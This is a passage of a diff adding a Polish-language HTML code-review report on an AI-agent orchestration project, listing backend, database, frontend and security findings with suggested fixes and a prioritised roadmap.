+            <span class="diff-good">CREATE UNIQUE INDEX IF NOT EXISTS idx_user_sessions_token ON user_sessions(token);</span>
+            <span class="diff-ctx">-- ✓ IF NOT EXISTS jest dobrą praktyką, ale nadal brak tablicy migration_history</span>
+          </div>
+          <div class="fix">
+            <strong>Poprawka (szybka):</strong> Dodać tabelę <code>CREATE TABLE IF NOT EXISTS schema_migrations(version INT PRIMARY KEY, applied_at TIMESTAMPTZ DEFAULT now())</code> i w migrate.ts sprawdzać <code>SELECT version FROM schema_migrations WHERE version = $1</code> przed każdym plikiem.
+          </div>
+        </div>
+      </div>
+
+      <div class="finding">
+        <div class="finding-head">
+          <span class="sev-tag sev-high">HIGH</span>
+          <span class="finding-title">KnowledgeService.search() — wyszukiwanie bez wektora, ignoruje query parameter</span>
+          <span class="finding-file">services/knowledge.ts:search()</span>
+        </div>
+        <div class="finding-body">
+          <p>Metoda <code>search(companyId, query)</code> przyjmuje parametr <code>query</code>, generuje embedding (mockowy), ale <em>w ogóle nie używa go w zapytaniu SQL</em>. Zapytanie po prostu zwraca pierwsze N dokumentów firmy posortowane według <code>created_at</code>. Kontekst wiedzy budowany dla agenta jest całkowicie losowy — agent dostaje te same dokumenty niezależnie od tego czego szuka.</p>
+          <div class="diff">
+            <span class="file-tag">services/knowledge.ts — query jest ignorowane:</span>
+            <span class="diff-ctx">async search(companyId: string, query: string, limit = 5) {</span>
+            <span class="diff-bad">  const mockEmbedding = Array(1536).fill(0).map(() => Math.random()); // losowy</span>
+            <span class="diff-ctx">  const res = await db.query(</span>
+            <span class="diff-bad">    'SELECT title, content FROM company_knowledge WHERE company_id = $1 LIMIT $2',</span>
+            <span class="diff-bad">    // ↑ brak ORDER BY embedding &lt;=&gt; $vector — query w ogóle nie używane</span>
+          </div>
+          <div class="fix">
+            <strong>Minimum viable fix:</strong> Dodać przynajmniej full-text search jako fallback do czasu prawdziwych embeddingów: <code>WHERE company_id = $1 AND (to_tsvector(content) @@ plainto_tsquery($2) OR $2 = '')</code>. Docelowo: <code>ORDER BY embedding &lt;=&gt; $embeddingVector LIMIT $3</code>.
+          </div>
+        </div>
+      </div>
+
+      <div class="finding">
+        <div class="finding-head">
+          <span class="sev-tag sev-medium">MEDIUM</span>
+          <span class="finding-title">Scheduler — zapytanie bez filtra company_id pobiera agentów ze wszystkich firm</span>
+          <span class="finding-file">orchestrator/scheduler.ts:startOrchestrator()</span>
+        </div>
+        <div class="finding-body">
+          <p>Pętla schedulera wykonuje <code>SELECT id FROM agents WHERE status = 'idle'</code> — bez kontekstu firmy, bez RLS (bo brak contextStore w workerze). W środowisku multi-tenant wszystkie idle agenty ze wszystkich firm są przetwarzane razem, co jest poprawne operacyjnie, ale przy włączonym RLS może powodować problemy jeśli kiedyś scheduler będzie działał w ograniczonym kontekście. Poważniejszy problem: brak filtru <code>AND status != 'terminated'</code>.</p>
+          <div class="diff">
+            <span class="file-tag">scheduler.ts:</span>
+            <span class="diff-bad">SELECT id FROM agents WHERE status = 'idle'</span>
+            <span class="diff-ctx">-- brak: AND status != 'terminated'</span>
+            <span class="diff-ctx">-- brak: ORDER BY last_heartbeat_at ASC LIMIT 50  (throttling)</span>
+          </div>
+          <div class="fix">
+            <strong>Poprawka:</strong> <code>SELECT id FROM agents WHERE status = 'idle' AND status != 'terminated' ORDER BY updated_at ASC LIMIT 50</code>. Limit zapobiega thundering herd gdy setki agentów są idle jednocześnie.
+          </div>
+        </div>
+      </div>
+
+      <div class="finding">
+        <div class="finding-head">
+          <span class="sev-tag sev-fixed">POPRAWA ✓</span>
+          <span class="finding-title">Indeksy v9 — znacząca poprawa wydajności zapytań krytycznych</span>
+          <span class="finding-file">db/schema_v9.sql</span>
+        </div>
+        <div class="finding-body">
+          <p>7 nowych indeksów trafia dokładnie w najczęstsze zapytania systemu: <code>idx_tasks_agent_status</code> przyspieszy heartbeat checkout, <code>idx_heartbeats_agent_time</code> przyspieszy safety check, <code>idx_audit_company_time</code> przyspieszy stronę audit log. Użycie <code>IF NOT EXISTS</code> jest właściwą praktyką. Jedyny brakujący indeks krytyczny: <code>idx_agents_company_status</code> dla zapytania schedulera.</p>
+        </div>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- ── 04 BACKEND — LOGIKA ── -->
+  <div class="section">
+    <div class="section-label">
+      <span class="section-num">04</span>
+      <span class="section-title">Backend — luki logiki biznesowej</span>
+      <span class="section-badge b-amber">WAŻNE</span>
+    </div>
+    <div class="findings">
+
+      <div class="finding">
+        <div class="finding-head">
+          <span class="sev-tag sev-high">HIGH</span>
+          <span class="finding-title">Template export eksportuje tylko agentów — brakuje tools, policies, goals, budgets</span>
+          <span class="finding-file">services/template.ts</span>
+        </div>
+        <div class="finding-body">
+          <p>README opisuje template jako "export entire companies — agents, goals, tools, policies, and org structure". Aktualny <code>TemplateService.exportCompany()</code> eksportuje tylko <code>name</code>, <code>mission</code> i <code>agents</code>. Import nie obsługuje celów, narzędzi ani polityk — agent po imporcie nie ma żadnych przypisanych narzędzi ani budżetu. Preset z README (<code>saas-startup.json</code> z "5 agents, tools, policies") nie może zostać odtworzony przez ten service.</p>
+          <div class="diff">
+            <span class="file-tag">template.ts — co jest, czego brakuje:</span>
+            <span class="diff-good">✓ company.name, company.mission</span>
+            <span class="diff-good">✓ agents (name, role, runtime, system_prompt)</span>
+            <span class="diff-bad">✗ goals — hierarchia celów nie eksportowana</span>
+            <span class="diff-bad">✗ tools — rejestr narzędzi firmy</span>
+            <span class="diff-bad">✗ agent_tools — przypisania narzędzi do agentów</span>
+            <span class="diff-bad">✗ policies — governance rules</span>
+            <span class="diff-bad">✗ monthly_budget_usd — limity budżetowe agentów</span>
+            <span class="diff-bad">✗ reports_to — hierarchia org chart</span>
+          </div>
+          <div class="fix">
+            <strong>Poprawka:</strong> Rozszerzyć export o 5 dodatkowych zapytań SQL i dostosować import z mapowaniem referencji (agent ref → new UUID). Dodać sanityzację secretów z <code>tool.config</code> (webhook_url, api_key) przed eksportem — co README obiecuje jako feature.
+          </div>
+        </div>
+      </div>
+
+      <div class="finding">
+        <div class="finding-head">
+          <span class="sev-tag sev-high">HIGH</span>
+          <span class="finding-title">GeminiRuntime nie jest rejestrowany w worker.ts — agenty z runtime=gemini się nie uruchamiają</span>
+          <span class="finding-file">worker.ts vs runtime/registry.ts</span>
+        </div>
+        <div class="finding-body">
+          <p><code>RuntimeRegistry</code> w konstruktorze rejestruje Gemini warunkowo (<code>if env.GOOGLE_API_KEY</code>). Ale <code>worker.ts</code> importuje tylko <code>ClaudeRuntime</code> i <code>OpenAIRuntime</code> — bez <code>GeminiRuntime</code>. Gdy <code>runtimeRegistry</code> jest singleton importowanym przez worker, registry jest tworzone <strong>bez</strong> wpisu Gemini bo GeminiRuntime nie jest importowany do kontekstu workera.</p>
+          <div class="diff">
+            <span class="file-tag">worker.ts — brakujący import:</span>
+            <span class="diff-ctx">import { ClaudeRuntime } from './runtime/claude.js';</span>
+            <span class="diff-ctx">import { OpenAIRuntime } from './runtime/openai.js';</span>
+            <span class="diff-bad">// brak: import { GeminiRuntime } from './runtime/gemini.js';</span>
+            <span class="diff-ctx">// Komentarz: "Runtimes are auto-registered in RuntimeRegistry constructor"</span>
+            <span class="diff-bad">// ↑ nieprawda — registry.ts musi być importowany by konstruktor się wykonał</span>
+          </div>
+          <div class="fix">
+            <strong>Poprawka:</strong> Dodać <code>import { GeminiRuntime } from './runtime/gemini.js'</code> do worker.ts. Alternatywnie — przerobić rejestrację na jawną: <code>runtimeRegistry.register('claude', new ClaudeRuntime())</code> zamiast polegać na side-effects importów.
+          </div>
+        </div>
+      </div>
+
+      <div class="finding">
+        <div class="finding-head">
+          <span class="sev-tag sev-medium">MEDIUM</span>
+          <span class="finding-title">resolveApproval() — odblokowanie taska bez sprawdzenia czy agent nadal istnieje</span>
+          <span class="finding-file">governance/approvals.ts:resolveApproval()</span>
+        </div>
+        <div class="finding-body">
+          <p>Gdy zatwierdzenie jest akceptowane, kod ustawia <code>task.status = 'in_progress'</code>. Nie sprawdza czy agent przypisany do taska jest nadal aktywny (może być <code>terminated</code> lub <code>paused</code>). Task zostaje odblokowany ale nikt go nie odbierze — scheduler pomija agenty nieaktywne. Task będzie "in_progress" na zawsze.</p>
+          <div class="fix">
+            <strong>Poprawka:</strong> Po ustawieniu <code>in_progress</code> sprawdzić <code>SELECT status FROM agents WHERE id = tasks.assigned_to</code>. Jeśli agent nie jest <code>idle</code>, ustawić task z powrotem na <code>assigned</code> i rozważyć powiadomienie.
+          </div>
+        </div>
+      </div>
+
+      <div class="finding">
+        <div class="finding-head">
+          <span class="sev-tag sev-medium">MEDIUM</span>
+          <span class="finding-title">policies.ts — typy 'rate_limit' i 'tool_restriction' zdefiniowane w schema ale nie obsługiwane</span>
+          <span class="finding-file">governance/policies.ts</span>
+        </div>
+        <div class="finding-body">
+          <p>Schema v2 i Zod schema w <code>companies.ts</code> definiują 5 typów polityk: <code>approval_required</code>, <code>budget_threshold</code>, <code>delegation_limit</code>, <code>rate_limit</code>, <code>tool_restriction</code>. Funkcja <code>evaluatePolicy()</code> obsługuje tylko pierwsze trzy. Tworzenie polityk <code>rate_limit</code> lub <code>tool_restriction</code> jest możliwe przez API, ale nie wywołuje żadnego efektu — switch case nie ma ich obsługi.</p>
+          <div class="fix">
+            <strong>Poprawka:</strong> Albo usunąć te typy z enuma (podejście uczciwe), albo zaimplementować: <code>rate_limit</code> sprawdza <code>heartbeats</code> z ostatniej godziny vs <code>rules.max_per_hour</code>, <code>tool_restriction</code> blokuje określone narzędzia dla agentów.
+          </div>
+        </div>
+      </div>
+
+      <div class="finding">
+        <div class="finding-head">
+          <span class="sev-tag sev-medium">MEDIUM</span>
+          <span class="finding-title">Brak graceful shutdown w worker.ts — osierocone taski przy deploymencie</span>
+          <span class="finding-file">worker.ts</span>
+        </div>
+        <div class="finding-body">
+          <p>Worker nie obsługuje <code>SIGTERM</code> ani <code>SIGINT</code>. Docker Compose wysyła SIGTERM podczas <code>docker compose down</code> lub rolling deploy i czeka domyślnie 10 sekund przed SIGKILL. Aktywne heartbeaty są natychmiastowo przerywane, taski zostają z <code>status='in_progress'</code> i <code>locked_by=agentId</code>. Następne uruchomienie workera nie może odebrać tych tasków.</p>
+          <div class="fix">
+            <strong>Poprawka:</strong><br>
+            <code>process.on('SIGTERM', async () => { stopOrchestrator(); await db.query("UPDATE tasks SET status='assigned', locked_by=NULL WHERE locked_by IS NOT NULL"); await db.close(); process.exit(0); });</code>
+          </div>
+        </div>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- ── 05 FRONTEND ── -->
+  <div class="section">
+    <div class="section-label">
+      <span class="section-num">05</span>
+      <span class="section-title">Frontend — stan po v9</span>
+      <span class="section-badge b-sky">AKTUALIZACJA</span>
+    </div>
+
+    <table class="ctable" style="margin-bottom:20px;">
+      <thead>
+        <tr>
+          <th>Strona</th>
+          <th>Status v1</th>
+          <th>Status v2</th>
+          <th>Uwagi</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr>
+          <td><code>DashboardPage</code></td>
+          <td class="bad-cell">Placeholder (hardcoded)</td>
+          <td class="ok-cell">✓ Live stats z API</td>
+          <td>4 karty + 2 panele z real data</td>
+        </tr>
+        <tr>
+          <td><code>GoalsPage</code></td>
+          <td class="bad-cell">Placeholder</td>
+          <td class="warn-cell">⚠ Lista flat</td>
+          <td>Fetchuje dane, ale brak drzewa hierarchii — parent_id oznaczone tylko "Child goal"</td>
+        </tr>
+        <tr>
+          <td><code>ToolsPage</code></td>
+          <td class="bad-cell">Placeholder</td>
+          <td class="ok-cell">✓ Grid kart</td>
+          <td>Ikony per typ, agent_count, empty state</td>
+        </tr>
+        <tr>
+          <td><code>AgentsPage</code></td>
+          <td class="ok-cell">✓</td>
+          <td class="ok-cell">✓</td>
+          <td>Bez zmian, działa</td>
+        </tr>
+        <tr>
+          <td><code>AuthPage</code></td>
+          <td class="bad-cell">Brak</td>
+          <td class="ok-cell">✓ Nowa</td>
+          <td>Login + Register, integracja z AuthContext</td>
+        </tr>
+        <tr>
+          <td><code>BudgetsPage</code></td>
+          <td class="bad-cell">Brak</td>
+          <td class="bad-cell">Nadal brak</td>
+          <td>API /budgets istnieje, frontend nie</td>
+        </tr>
+        <tr>
+          <td><code>OrgChartPage</code></td>
+          <td class="bad-cell">Brak</td>
+          <td class="bad-cell">Nadal brak</td>
+          <td>reports_to w DB, wizualizacja — zero</td>
+        </tr>
+        <tr>
+          <td><code>IntegrationsPage</code></td>
+          <td class="bad-cell">Brak</td>
+          <td class="bad-cell">Nadal brak</td>
+          <td>Webhook API istnieje, frontend — zero</td>
+        </tr>
+        <tr>
+          <td><code>TemplatePage</code></td>
+          <td class="bad-cell">Brak</td>
+          <td class="bad-cell">Nadal brak</td>
+          <td>Export/import API istnieje, frontend — zero</td>
+        </tr>
+      </tbody>
+    </table>
+
+    <div class="findings">
+      <div class="finding">
+        <div class="finding-head">
+          <span class="sev-tag sev-medium">MEDIUM</span>
+          <span class="finding-title">GoalsPage — flat list zamiast drzewa; parent_id istnieje ale hierarchia niewidoczna</span>
+          <span class="finding-file">pages/GoalsPage.tsx</span>
+        </div>
+        <div class="finding-body">
+          <p>Dane zawierają <code>parent_id</code> i komponent oznacza dzieci jako "Child goal", ale wyświetla je w prostej liście bez wcięć, bez łączenia z rodzicem, bez możliwości zwijania gałęzi. Kluczowa koncepcja projektu — hierarchia celów od misji do konkretnego taska — jest niewidoczna w UI. Dane są w bazie, brakuje tylko 20 linii rekurencyjnego renderowania.</p>
+          <div class="fix">
+            <strong>Poprawka:</strong> Dodać funkcję <code>buildTree(goals: Goal[])</code> która buduje <code>children[]</code> per węzeł, a następnie renderować rekurencyjnie <code>GoalNode</code> z <code>paddingLeft = depth * 20px</code> i ikoną gałęzi.
+          </div>
+        </div>
+      </div>
+
+      <div class="finding">
+        <div class="finding-head">
+          <span class="sev-tag sev-medium">MEDIUM</span>
+          <span class="finding-title">useApi() — brak retry, brak abort controller, request może "wyciec" po odmontowaniu komponentu</span>
+          <span class="finding-file">hooks/useApi.ts</span>
+        </div>
+        <div class="finding-body">
+          <p>Hook nie używa <code>AbortController</code>. Gdy komponent jest odmontowany podczas oczekiwania na odpowiedź (np. szybka nawigacja), <code>setLoading(false)</code> i <code>setError()</code> są wywoływane na odmontowanym komponencie — React 18 wyświetli warning. W przypadku wolnego API lub dużego dashboardu to częsty scenariusz.</p>
+          <div class="fix">
+            <strong>Poprawka:</strong> Opakować <code>useEffect</code> w <code>const controller = new AbortController()</code>, przekazać <code>signal: controller.signal</code> do <code>fetch()</code>, i w cleanup <code>return () => controller.abort()</code>.
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ── 06 JAKOŚĆ KODU ── -->
+  <div class="section">
+    <div class="section-label">
+      <span class="section-num">06</span>
+      <span class="section-title">Jakość kodu — pozostałe techniczne długi</span>
+      <span class="section-badge b-violet">TECH DEBT</span>
+    </div>
+    <div class="findings">
+
+      <div class="finding">
+        <div class="finding-head">
+          <span class="sev-tag sev-high">HIGH</span>
+          <span class="finding-title">AgentActionsSchema — Zod discriminated union jest, ale heartbeat.ts nadal nie waliduje odpowiedzi modelu przez ten schema</span>
+          <span class="finding-file">types/agent.ts ↔ orchestrator/heartbeat.ts</span>
+        </div>
+        <div class="finding-body">
+          <p><code>types/agent.ts</code> ma doskonały <code>AgentActionsSchema</code> z Zod discriminated union dla wszystkich typów akcji. <code>heartbeat.ts</code> parsuje JSON z odpowiedzi LLM i wkłada go bezpośrednio do <code>for (const action of response.actions)</code> — bez jednej linii walidacji przez ten schema. Błędne typy akcji, brakujące pola, i malformed JSON są propagowane do obsługi bez żadnej ochrony.</p>
+          <div class="diff">
+            <span class="file-tag">claude.ts — brakująca walidacja:</span>
+            <span class="diff-ctx">actions = JSON.parse(actionsMatch[1].trim());</span>
+            <span class="diff-bad">// ← brak: const validated = AgentActionsSchema.safeParse(actions)</span>
+            <span class="diff-bad">// ← brak: if (!validated.success) { logger.error(...); actions = []; }</span>
+          </div>
+          <div class="fix">
+            <strong>Poprawka (2 linie):</strong> Po parsowaniu JSON dodać <code>const validated = AgentActionsSchema.safeParse(parsedActions); actions = validated.success ? validated.data : [];</code>. Jeśli walidacja failuje — log + fallback na <code>continue</code> action.
+          </div>
+        </div>
+      </div>
+
+      <div class="finding">
+        <div class="finding-head">
+          <span class="sev-tag sev-medium">MEDIUM</span>
+          <span class="finding-title">routes/index.ts — /policies mapuje na companies router (błąd copy-paste)</span>
+          <span class="finding-file">routes/index.ts:31</span>
+        </div>
+        <div class="finding-body">
+          <p>Linia <code>router.use('/policies', companies)</code> montuje router <code>companies</code> pod ścieżką <code>/policies</code>. Oznacza to że <code>POST /api/policies</code> trafia do handlera tworzenia firmy zamiast handlera tworzenia polityki. Polityki mają własne endpointy zdefiniowane wewnątrz <code>companies.ts</code> pod <code>/policies</code>, ale zewnętrzna ścieżka jest zepsuta.</p>
+          <div class="diff">
+            <span class="file-tag">routes/index.ts:</span>
+            <span class="diff-bad">router.use('/policies', companies);  // ← powinno być: brak tej linii</span>
+            <span class="diff-ctx">// polityki są już dostępne przez /companies/policies/*</span>
+            <span class="diff-ctx">// lub: import policies from './policies.js'</span>
+          </div>
+          <div class="fix">
+            <strong>Poprawka:</strong> Usunąć linię lub stworzyć dedykowany <code>routes/policies.ts</code> router i podmontować go tu.
+          </div>
+        </div>
+      </div>
+
+      <div class="finding">
+        <div class="finding-head">
+          <span class="sev-tag sev-medium">MEDIUM</span>
+          <span class="finding-title">Gemini runtime wysyła systemPrompt jako pierwszą wiadomość czatu — niezgodne z Gemini API</span>
+          <span class="finding-file">runtime/gemini.ts</span>
+        </div>
+        <div class="finding-body">
+          <p>Gemini API wymaga że <code>history</code> musi zaczynać się od roli <code>'user'</code>, a nie <code>'model'</code>. <code>GeminiRuntime</code> mapuje historię z <code>assistant → model</code>, ale nie sprawdza czy pierwsza wiadomość jest poprawna. Ponadto <code>systemPrompt</code> jest wysyłany jako argument do <code>chat.sendMessage(systemPrompt)</code> — co oznacza że system prompt jest <em>pierwszą wiadomością użytkownika</em>, nie systemowym promptem. Gemini 2.0 Flash obsługuje <code>systemInstruction</code> jako osobne pole.</p>
+          <div class="fix">
+            <strong>Poprawka:</strong> Użyć <code>model.startChat({ systemInstruction: { parts: [{ text: systemPrompt }] }, history: filteredHistory })</code> gdzie <code>filteredHistory</code> zapewnia że zaczyna się od <code>'user'</code>. Następnie wywołać <code>chat.sendMessage(task.description)</code> zamiast systemu.
+          </div>
+        </div>
+      </div>
+
+      <div class="finding">
+        <div class="finding-head">
+          <span class="sev-tag sev-low">INFO</span>
+          <span class="finding-title">Brak typów odpowiedzi API — frontend używa any[] dla większości danych</span>
+          <span class="finding-file">pages/*.tsx</span>
+        </div>
+        <div class="finding-body">
+          <p>Mimo że <code>types/agent.ts</code> jest solidnie otypowany, wszystkie odpowiedzi API w dashboardzie są rzutowane przez <code>any</code> lub inferowane z lokalnych <code>type</code> definicji które dublują schemat serwera. Brakuje shared types package (<code>@biuro/types</code>) współdzielonego między <code>server</code> i <code>dashboard</code>. Każda zmiana schematu wymaga ręcznej synchronizacji typów w obu miejscach.</p>
+          <div class="fix">
+            <strong>Sugestia długoterminowa:</strong> Dodać <code>packages/types/</code> z eksportami typów DB entities i używać go w obu packageach. Ewentualnie wygenerować typy ze schematu SQL przez <code>pg-to-ts</code> lub <code>kysely-codegen</code>.
+          </div>
+        </div>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- ── 07 PRIORYTETY ── -->
+  <div class="section">
+    <div class="section-label">
+      <span class="section-num">07</span>
+      <span class="section-title">Zaktualizowane priorytety — co robić teraz</span>
+      <span class="section-badge b-emerald">ROADMAP</span>
+    </div>
+
+    <div class="plist">
+      <div class="prow">
+        <span class="pnum">1</span>
+        <div>
+          <h4>🔴 Bash sandbox — whitelist komend lub Docker exec</h4>
+          <p>Największe otwarte ryzyko RCE. Dodać <code>tool.config.allowed_commands[]</code> i walidować przed exec. Blokuje klasę ataków natychmiast bez dużego refactoru.</p>
+        </div>
+        <span class="peff eff-high">Krytyczne</span>
+      </div>
+      <div class="prow">
+        <span class="pnum">2</span>
+        <div>
+          <h4>🔴 Integracje Slack/Discord — weryfikacja podpisu</h4>
+          <p>Otwarte endpointy przyjmujące zewnętrzny input bez auth. Middleware <code>verifySlackSignature</code> to ~30 linii kodu, usuwa wektor content injection.</p>
+        </div>
+        <span class="peff eff-high">Krytyczne</span>
+      </div>
+      <div class="prow">
+        <span class="pnum">3</span>
+        <div>
+          <h4>🔴 Token sesji → randomBytes(32)</h4>
+          <p>Zamiana jednej linii w <code>routes/auth.ts</code>. Eliminuje słabość kryptograficzną przy minimalnym nakładzie.</p>
+        </div>
+        <span class="peff eff-high">Wysoki / szybkie</span>
+      </div>
+      <div class="prow">
+        <span class="pnum">4</span>
+        <div>
+          <h4>🔴 db.transaction() — dodać RLS context</h4>
+          <p>Bez tego wszystkie operacje transakcyjne (tworzenie agentów, heartbeat, hire) omijają Row Level Security. Bezpośredni wpływ na izolację danych multi-tenant.</p>
+        </div>
+        <span class="peff eff-high">Krytyczne</span>
+      </div>
+      <div class="prow">
+        <span class="pnum">5</span>
+        <div>
+          <h4>🟡 helmet + cors(origin) + rate-limit na /auth</h4>
+          <p>3 pakiety npm, ~5 linii konfiguracji. Dodaje standardową warstwę hardening HTTP i blokuje brute-force haseł.</p>
+        </div>
+        <span class="peff eff-high">Wysoki / szybkie</span>
+      </div>
+      <div class="prow">
+        <span class="pnum">6</span>
+        <div>
+          <h4>🟡 System migracji — tabela schema_migrations</h4>
+          <p>Prosta tabela tracking + sprawdzanie przed każdym plikiem SQL. Eliminuje ryzyko wielokrotnego stosowania migracji na produkcji.</p>
+        </div>
+        <span class="peff eff-med">Średni</span>
+      </div>
+      <div class="prow">
+        <span class="pnum">7</span>
+        <div>
+          <h4>🟡 AgentActionsSchema.safeParse() w runtimes</h4>
+          <p>Schema już istnieje — wystarczy ją użyć. Chroni orchestrator przed malformed akcjami LLM. Zapobiega klasie silent failures.</p>
+        </div>
+        <span class="peff eff-med">Średni / szybkie</span>
+      </div>
+      <div class="prow">
+        <span class="pnum">8</span>
+        <div>
+          <h4>🟡 GeminiRuntime — import w worker.ts + fix systemInstruction</h4>
+          <p>Dodać import do workera (1 linia) i poprawić wywołanie Gemini API by używało <code>systemInstruction</code>. Gemini agenty są aktualnie broken.</p>
+        </div>
+        <span class="peff eff-med">Średni / szybkie</span>
+      </div>
+      <div class="prow">
+        <span class="pnum">9</span>
+        <div>
+          <h4>🟡 GoalsPage — drzewo hierarchii, BudgetsPage, OrgChartPage</h4>
+          <p>Dane są w bazie. Drzewo celów to ~30 linii recursive renderer. BudgetsPage i OrgChart to kluczowe strony dla użytkownika zarządzającego firmą AI.</p>
+        </div>
+        <span class="peff eff-med">Średni</span>
+      </div>
+      <div class="prow">
+        <span class="pnum">10</span>
+        <div>
+          <h4>🟢 KnowledgeService — full-text fallback lub prawdziwe embeddingi</h4>
+          <p>Minimum: PostgreSQL <code>to_tsvector</code> zamiast ignorowania query. Docelowo: Voyage API lub OpenAI embeddings. RAG jest kluczową funkcją projektu.</p>
+        </div>
+        <span class="peff eff-low">Ważny</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- ── 08 VERDICT ── -->
+  <div class="section">
+    <div class="section-label">
+      <span class="section-num">08</span>
+      <span class="section-title">Werdykt — porównanie v1 → v2</span>
+      <span class="section-badge b-emerald">PODSUMOWANIE</span>
+    </div>
+
+    <div style="margin-bottom:24px;">
+      <div class="pbar-row">
+        <span class="pbar-lbl">Architektura</span>
+        <div class="pbar-track"><div class="pbar-fill" style="width:80%;background:var(--emerald);"></div></div>
+        <span class="pbar-pct">80%</span>
+      </div>
+      <div class="pbar-row">
+        <span class="pbar-lbl">Bezpieczeństwo</span>
+        <div class="pbar-track"><div class="pbar-fill" style="width:65%;background:#fbbf24;"></div></div>
+        <span class="pbar-pct">65%</span>
+      </div>
+      <div class="pbar-row">
+        <span class="pbar-lbl">Jakość kodu</span>
+        <div class="pbar-track"><div class="pbar-fill" style="width:65%;background:#fbbf24;"></div></div>
+        <span class="pbar-pct">65%</span>
+      </div>
+      <div class="pbar-row">
+        <span class="pbar-lbl">Pokrycie testami</span>
+        <div class="pbar-track"><div class="pbar-fill" style="width:15%;background:var(--rose);"></div></div>
+        <span class="pbar-pct">15%</span>
+      </div>
+      <div class="pbar-row">
+        <span class="pbar-lbl">Feature completeness</span>
+        <div class="pbar-track"><div class="pbar-fill" style="width:65%;background:#fbbf24;"></div></div>
+        <span class="pbar-pct">65%</span>
+      </div>
+    </div>
+
+    <div class="verdict-box">
+      <h3>Projekt wyraźnie dojrzewa — ale kilka krytycznych luk pozostaje</h3>
+      <p>
+        Commit v9 zamknął największy problem z raportu v1: <span class="hl-green">AUTH działa, hasła są hashowane poprawnie przez scrypt, dashboard pokazuje live dane, AuthContext obsługuje pełny flow sesji</span>. To realny postęp, nie tylko kosmetyczny.
+      </p>
+      <p>
+        Trzy problemy nadal blokują deployment produkcyjny: <span class="hl-rose">bash exec bez sandboxu</span> (RCE), <span class="hl-rose">integracje bez weryfikacji podpisu</span> (content injection), i <span class="hl-rose">db.transaction() omijające RLS</span> (data leak między firmami). Każdy z nich można naprawić w ciągu pół dnia pracy.
+      </p>
+      <p>
+        Długi techniczne drugiej kategorii — <span class="hl-amber">brak testów, mock embeddingi, GoalsPage jako flat list, template export niekompletny, Gemini broken w workerze</span> — nie blokują działania ale obniżają jakość produktu widoczną dla użytkownika.
+      </p>
+      <p>
+        Przy nakładzie <span class="hl-sky">1 tygodnia skupionego na punktach 1–5</span> projekt osiągnie poziom bezpieczny do beta testu z prawdziwymi użytkownikami. Fundamenty są solidne — <span class="highlight">to dobry projekt który potrzebuje jeszcze jednego sprintu security hardening</span>.
+      </p>
+    </div>
+  </div>
+
+</div>
+
+<footer>
+  <span>Autonomiczne Biuro · Code Review v2 · Post-commit schema_v9</span>
+  <span>Claude Sonnet 4.6 · 18.03.2026 · Warsaw, PL</span>
+</footer>
+
+</body>
+</html>
